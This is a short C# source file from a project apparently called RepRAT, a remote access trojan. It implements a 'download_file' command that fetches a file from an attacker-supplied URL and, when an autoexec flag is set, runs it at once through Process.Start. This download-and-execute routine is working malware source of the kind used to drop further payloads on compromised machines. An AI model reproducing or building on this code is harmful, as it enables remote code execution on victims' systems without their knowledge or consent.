using System.Diagnostics;
using System.Net;

namespace RepRAT.Commands.download_file;

public class Main
{
    //Help:
    //download_file URL FILENAME AUTOEXEC(TRUE,FALSE)
    public static void exec(string command) 
    {
        var args = command.Replace("download_file ", "");
        var url = args.Split(" ")[0];
        var filename = args.Split(" ")[1];
        var autoexec = args.Split(" ")[2];
        DownloadFILE(url, filename, autoexec);
    }

    private static void DownloadFILE(string URL, string filename, string autoexec)
    {
        using (var client = new WebClient())
        {
            client.DownloadFile(URL, filename);
            if (autoexec == "true")
            {
                var p = new Process();
                p.StartInfo = new ProcessStartInfo(filename)
                { 
                    UseShellExecute = true 
                };
                p.Start();
            }
        }
    }
}